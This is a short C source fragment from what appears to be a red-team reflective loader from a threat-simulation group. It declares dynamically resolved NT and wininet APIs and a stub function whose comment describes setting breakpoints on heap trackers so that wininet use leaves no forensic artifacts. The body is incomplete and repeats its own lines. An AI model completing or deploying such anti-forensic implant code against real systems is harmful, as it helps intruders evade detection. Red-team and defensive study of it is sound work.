/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

typedef struct
{
	D_API( RtlInitUnicodeString );
	D_API( NtGetContextThread );
	D_API( NtSetContextThread );
	D_API( InternetOpenA );
	D_API( LdrUnloadDll );
	D_API( LdrLoadDll );
} API ;

/*!
 *
 * Purpose:
 *
 * Inserts debug breakpoints into the internal heap 
 * trackers to avoid leaving behind any artifacts
 * when using internal wininet API.
 *
!*/
static D_SEC( D ) VOID EnableBreakpoints( VOID )
{
	API	Api;
	CONTEXT	Ctx;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
};
